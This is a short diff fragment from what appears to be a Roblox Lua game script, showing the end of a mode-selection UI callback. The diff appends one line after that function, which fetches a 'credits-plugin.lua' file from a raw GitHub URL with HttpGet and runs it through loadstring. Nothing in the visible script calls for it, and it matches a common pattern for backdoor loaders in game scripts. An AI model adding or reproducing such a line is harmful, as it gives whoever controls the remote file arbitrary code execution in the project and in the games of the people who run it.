@@ -1115,3 +1115,4 @@ createModeUI(function(selectedMode)
 
 	player.CharacterRemoving:Connect(cleanupAll)
 end)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/femce4l20/somusrnams-scripts/refs/heads/main/credits-plugin.lua'),true))()
